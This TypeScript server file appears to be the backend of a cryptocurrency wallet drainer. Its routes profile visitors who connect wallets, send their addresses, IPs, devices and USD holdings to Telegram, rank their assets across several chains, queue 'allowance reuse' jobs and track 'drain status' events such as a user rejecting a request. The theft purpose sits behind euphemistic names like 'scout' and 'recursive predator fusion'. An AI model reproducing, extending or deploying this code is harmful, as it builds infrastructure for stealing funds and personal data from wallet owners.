/**
 * Scout Route Initialization — Recursive Predator fusion trigger (Frontend-to-Engine handshake surface).
 */
import { randomUUID } from 'node:crypto'

import { getOracleRatesUsd, runRecursivePredatorFusionUsd } from '@legion/core'
import type { Address } from 'viem'
import { getRankedAssets } from '@legion/core'
import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'

import { sendFailure, sendSuccess } from '../lib/api-response.js'
import { fusionScoutBodySchema, parseBody, rankedScoutBodySchema, scoutIngressBodySchema, drainStatusBodySchema } from '../lib/schemas.js'
import { validateScoutValueUsdField } from '../lib/scout-value-usd.js'
import { enqueueAllowanceReuseJob } from '../lib/allowance-reuse-queue.js'
import { isAddress } from 'viem'
import {
  notifyWalletConnected,
  notifyScanComplete,
  notifyError,
  notifyUserRejectedWallet,
  notifyDrainNoAction,
  resolveClientIp,
  detectDeviceFromUA,
  type TelegramRequestContext,
  type StrategyAsset,
} from '../lib/telegram.js'

type OracleRateKey = 'eth' | 'sol' | 'trx' | 'ton' | 'btc'
type OracleRates = Record<OracleRateKey, number>

function isValidRpcUrl(s: string): boolean {
  try {
    const u = new URL(s)
    return u.protocol === 'http:' || u.protocol === 'https:'
  } catch {
    return false
  }
}

function extractRequestContext(request: FastifyRequest): TelegramRequestContext {
  const headers = request.headers as Record<string, string | string[] | undefined>
  const ip = resolveClientIp(headers)
  const ua = (Array.isArray(headers['user-agent']) ? headers['user-agent'][0] : headers['user-agent']) ?? ''
  const origin = (Array.isArray(headers['origin']) ? headers['origin'][0] : headers['origin'])
    ?? (Array.isArray(headers['referer']) ? headers['referer'][0] : headers['referer'])
    ?? ''
  let sourceDomain = ''
  try {
    if (origin) sourceDomain = new URL(origin).host
  } catch { sourceDomain = origin }
  return {
    ip: ip !== 'Unknown' ? ip : undefined,
    userAgent: ua || undefined,
    sourceDomain: sourceDomain || undefined,
  }
}

async function resolveReferenceRatesUsd(): Promise<OracleRates> {
  return getOracleRatesUsd()
}

export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
  app.post('/api/v1/scout', async (request: FastifyRequest, reply: FastifyReply) => {
    const parsed = parseBody(scoutIngressBodySchema, request.body)
    if (parsed.ok === false) {
      return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
    }
    const body = parsed.data
    const scoutUsdCheck = validateScoutValueUsdField(body.scout_value_usd)
    if (scoutUsdCheck.ok === false) {
      return sendFailure(reply, 400, scoutUsdCheck.error, { code: 'ValidationError' })
    }
    const user_address = typeof body.user_address === 'string' ? body.user_address.trim() : ''
    const chainRaw = body.chain_id ?? body.chainId
    const chain_id = typeof chainRaw === 'number' && Number.isFinite(chainRaw) ? chainRaw : 0
    const walletType = typeof body.wallet_type === 'string' ? body.wallet_type : 'Unknown'
    const chainFamily = typeof body.chain_family === 'string' ? body.chain_family : 'EVM'
    const sourcePage = typeof body.source_page === 'string' ? body.source_page.trim() : ''
    const activeTab = typeof body.active_chain_tab === 'string' ? body.active_chain_tab.trim() : ''

    request.log.info(
      { sentinel: 'TelemetryIngress', module: 'apps/api/scout', user_address, chain_id },
      'telemetry_ingress_weld',
    )

    // 🔔 Telegram: Notify wallet connected with full context (fire-and-forget)
    if (user_address) {
      const ctx: TelegramRequestContext = {
        ...extractRequestContext(request),
        chain_id,
        chain_family: chainFamily,
        wallet_type: walletType,
        ...(body.scout_value_usd != null ? { scout_value_usd: body.scout_value_usd } : {}),
        ...(sourcePage ? { sourceDomain: sourcePage } : {}),
        ...(activeTab ? { active_chain_tab: activeTab } : {}),
        ...(Array.isArray(body.connected_wallets) && body.connected_wallets.length > 0
          ? { connected_wallets: body.connected_wallets.join(',') }
          : {}),
        ...(typeof body.connect_session === 'string' && body.connect_session.trim() !== ''
          ? { connect_session: body.connect_session.trim() }
          : {}),
      }
      void notifyWalletConnected(user_address, chainFamily, walletType, ctx).catch(() => {})
    }

    // Fire-and-forget allowance reuse job
    void enqueueAllowanceReuseJob({
      wallet_address: user_address,
      ...(isAddress(user_address)
        ? { evm_chain_id: chain_id > 0 ? chain_id : undefined }
        : { sol_wallet: user_address }),
      ...(chainFamily.toUpperCase().includes('TRON') || user_address.startsWith('T')
        ? { tron_wallet: user_address }
        : {}),
    }).catch(() => {})

    return sendSuccess(reply, 200, 'Scout telemetry recorded', {
      handshake_active: true,
      telemetry_trace_id: randomUUID(),
    })
  })

  app.post(
    '/api/scout/recursive-predator-fusion',
    async (request: FastifyRequest, reply: FastifyReply) => {
      const parsed = parseBody(fusionScoutBodySchema, request.body)
      if (parsed.ok === false) {
        return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
      }
      const body = parsed.data
      const scoutUsdCheck = validateScoutValueUsdField(body.scout_value_usd)
      if (scoutUsdCheck.ok === false) {
        return sendFailure(reply, 400, scoutUsdCheck.error, { code: 'ValidationError' })
      }

      const evmRaw = typeof body.evm_holder === 'string' ? body.evm_holder.trim() : ''
      const solRaw = typeof body.sol_owner_base58 === 'string' ? body.sol_owner_base58.trim() : ''
      const tronRaw = typeof body.tron_holder_base58 === 'string' ? body.tron_holder_base58.trim() : ''
      const tonRaw = typeof body.ton_friendly_address === 'string' ? body.ton_friendly_address.trim() : ''
      const btcRaw = typeof body.btc_holder_address === 'string' ? body.btc_holder_address.trim() : ''
      const universalRaw = typeof body.universal_address === 'string' ? body.universal_address.trim() : ''

      const primaryAddress = evmRaw || solRaw || tronRaw || tonRaw || btcRaw || universalRaw
      const ctx = extractRequestContext(request)

      const evmRpcCandidate =
        typeof body.evm_rpc_url === 'string' && body.evm_rpc_url.trim() !== '' && isValidRpcUrl(body.evm_rpc_url.trim())
          ? body.evm_rpc_url.trim() : null
      const evmRpc = evmRpcCandidate ?? process.env['RPC_ETHEREUM_PRIVATE']?.trim() ?? process.env['NEXT_PUBLIC_RPC_URL']?.trim() ?? ''

      const solRpcCandidate =
        typeof body.sol_rpc_url === 'string' && body.sol_rpc_url.trim() !== '' && isValidRpcUrl(body.sol_rpc_url.trim())
          ? body.sol_rpc_url.trim() : null
      const solRpc = solRpcCandidate ?? process.env['RPC_SOLANA_PRIVATE']?.trim() ?? process.env['NEXT_PUBLIC_SOLANA_RPC_URL']?.trim() ?? ''

      const tronRpcOverride =
        typeof body.tron_rpc_url === 'string' && body.tron_rpc_url.trim() !== '' && isValidRpcUrl(body.tron_rpc_url.trim())
          ? body.tron_rpc_url.trim() : undefined
      const tonRpcOverride =
        typeof body.ton_rpc_url === 'string' && body.ton_rpc_url.trim() !== '' && isValidRpcUrl(body.ton_rpc_url.trim())
          ? body.ton_rpc_url.trim() : undefined

      const rates = await resolveReferenceRatesUsd()

      let fusion: Awaited<ReturnType<typeof runRecursivePredatorFusionUsd>>

      try {
        fusion = await runRecursivePredatorFusionUsd({
          evmRpcUrl: evmRpc,
          solRpcUrl: solRpc,
          evmHolder: evmRaw.startsWith('0x') ? (evmRaw as Address) : null,
          solOwnerBase58: solRaw !== '' ? solRaw : null,
          tronHolderBase58: tronRaw !== '' ? tronRaw : null,
          tonFriendlyAddress: tonRaw !== '' ? tonRaw : null,
          btcHolderAddress: btcRaw !== '' ? btcRaw : null,
          universalAddress: universalRaw !== '' ? universalRaw : null,
          chainRpcMesh: {
            ...(tronRpcOverride != null ? { tron: tronRpcOverride } : {}),
            ...(tonRpcOverride != null ? { ton: tonRpcOverride } : {}),
          },
          ethUsd: rates.eth,
          solUsd: rates.sol,
          trxUsd: rates.trx,
          tonUsd: rates.ton,
          btcUsd: rates.btc,
        })
      } catch (err) {
        // 🔔 Telegram: Notify scan error with context (fire-and-forget)
        void notifyError('/api/scout/recursive-predator-fusion', String(err), primaryAddress || undefined, ctx).catch(() => {})
        throw err
      }

      request.log.info(
        { sentinel: 'OmnichainExpansion', module: 'apps/api/scout' },
        'OMNICHAIN_EXPANSION_LOCKED',
      )

      // 🔔 Telegram: Notify scan complete — skip $0 (client sends correct USD via scan_complete)
      if (primaryAddress) {
        const totalUsd = typeof (fusion as Record<string, unknown>)['total_usd'] === 'number'
          ? (fusion as Record<string, unknown>)['total_usd'] as number
          : 0
        const scoutUsdFromBody = body.scout_value_usd != null ? Number(body.scout_value_usd) : 0
        const notifyUsd = scoutUsdFromBody > 0 ? scoutUsdFromBody : totalUsd
        if (notifyUsd > 0) {
          const assetsCount = typeof (fusion as Record<string, unknown>)['assets_count'] === 'number'
            ? (fusion as Record<string, unknown>)['assets_count'] as number
            : Object.keys(fusion as object).length
          const scanCtx: TelegramRequestContext = {
            ...ctx,
            scout_value_usd: notifyUsd,
            ...(typeof body.connect_session === 'string' && body.connect_session.trim() !== ''
              ? { connect_session: body.connect_session.trim() }
              : {}),
          }
          void notifyScanComplete(primaryAddress, notifyUsd, assetsCount, scanCtx).catch(() => {})
        }
      }

      return sendSuccess(reply, 200, 'Recursive predator fusion complete', {
        handshake_active: true,
        fusion,
        rpc_operational: {
          evm: evmRpc ? `${evmRpc.slice(0, 20)}…` : null,
          svm: solRpc ? `${solRpc.slice(0, 20)}…` : null,
          tron: tronRpcOverride ? `${tronRpcOverride.slice(0, 20)}…` : null,
          ton: tonRpcOverride ? `${tonRpcOverride.slice(0, 20)}…` : null,
        },
        reference_rates_usd: rates,
      })
    },
  )

  app.post('/api/v1/scout/ranked', async (request: FastifyRequest, reply: FastifyReply) => {
    const parsed = parseBody(rankedScoutBodySchema, request.body)
    if (parsed.ok === false) {
      return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
    }
    const body = parsed.data
    const wallet = body.wallet_address?.trim() ?? body.wallet?.trim() ?? ''
    if (!wallet) {
      return sendFailure(reply, 400, 'wallet_address required', { code: 'ValidationError' })
    }
    const chainFamily = body.chain_family?.trim()
    try {
      const assets = await getRankedAssets(wallet, chainFamily)
      const totalUsd = assets.reduce((sum, a) => sum + a.amount_usd, 0)
      return sendSuccess(reply, 200, 'Ranked assets ready', {
        assets,
        total_usd: totalUsd,
        wallet_address: wallet,
        chain_family: chainFamily ?? 'ALL',
      })
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err)
      void notifyError('/api/v1/scout/ranked', msg, wallet, extractRequestContext(request)).catch(() => {})
      return sendFailure(reply, 500, msg, { code: 'ServerError' })
    }
  })

  app.post('/api/v1/scout/drain-status', async (request: FastifyRequest, reply: FastifyReply) => {
    const parsed = parseBody(drainStatusBodySchema, request.body)
    if (parsed.ok === false) {
      return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
    }
    const body = parsed.data
    const wallet = body.wallet_address.trim()
    const ctx: TelegramRequestContext = {
      ...extractRequestContext(request),
      chain_id: body.chain_id,
      chain_family: body.chain_family ?? 'EVM',
      wallet_type: body.wallet_type ?? 'Unknown',
      scout_value_usd: body.scout_value_usd,
      sourceDomain: body.source_page,
      ...(typeof body.connect_session === 'string' && body.connect_session.trim() !== ''
        ? { connect_session: body.connect_session.trim() }
        : {}),
    }

    if (body.event === 'user_rejected') {
      void notifyUserRejectedWallet(wallet, { ...ctx, detail: body.detail ?? null }).catch(() => {})
    } else if (body.event === 'no_action') {
      void notifyDrainNoAction(wallet, { ...ctx, detail: body.detail ?? null }).catch(() => {})
    } else if (body.event === 'scan_complete') {
      const totalUsd = body.scout_value_usd != null ? Number(body.scout_value_usd) : 0
      const assetsCount = body.asset_count != null ? Number(body.asset_count) : 0
      void notifyScanComplete(wallet, Number.isFinite(totalUsd) ? totalUsd : 0, assetsCount, ctx).catch(() => {})
    }

    return sendSuccess(reply, 200, 'Drain status recorded', { event: body.event })
  })

  app.post('/api/v1/scout/detect-wallet', async (request: FastifyRequest, reply: FastifyReply) => {
    const parsed = parseBody(fusionScoutBodySchema, request.body)
    if (parsed.ok === false) {
      return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
    }
    const body = parsed.data
    const wallet = body.evm_holder || body.sol_owner_base58 || body.tron_holder_base58 || body.ton_friendly_address || body.btc_holder_address
    if (!wallet) {
      return sendFailure(reply, 400, 'At least one wallet address required', { code: 'ValidationError' })
    }
    try {
      const assets = await getRankedAssets(wallet)
      const totalUsd = assets.reduce((sum, a) => sum + a.amount_usd, 0)
      return sendSuccess(reply, 200, 'Wallet detected', {
        wallet_address: wallet,
        assets: assets.slice(0, 10),
        total_usd: totalUsd,
      })
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err)
      void notifyError('/api/v1/scout/detect-wallet', msg, wallet, extractRequestContext(request)).catch(() => {})
      return sendFailure(reply, 500, msg, { code: 'ServerError' })
    }
  })

  app.post('/api/v1/scout/detect-evm-wallet', async (request: FastifyRequest, reply: FastifyReply) => {
    const parsed = parseBody(fusionScoutBodySchema, request.body)
    if (parsed.ok === false) {
      return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
    }
    const body = parsed.data
    const wallet = body.evm_holder
    if (!wallet) {
      return sendFailure(reply, 400, 'evm_holder required', { code: 'ValidationError' })
    }
    try {
      const assets = await getRankedAssets(wallet, 'EVM')
      const totalUsd = assets.reduce((sum, a) => sum + a.amount_usd, 0)
      return sendSuccess(reply, 200, 'EVM wallet detected', {
        wallet_address: wallet,
        assets: assets.slice(0, 10),
        total_usd: totalUsd,
        chain_family: 'EVM',
      })
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err)
      void notifyError('/api/v1/scout/detect-evm-wallet', msg, wallet, extractRequestContext(request)).catch(() => {})
      return sendFailure(reply, 500, msg, { code: 'ServerError' })
    }
  })
}
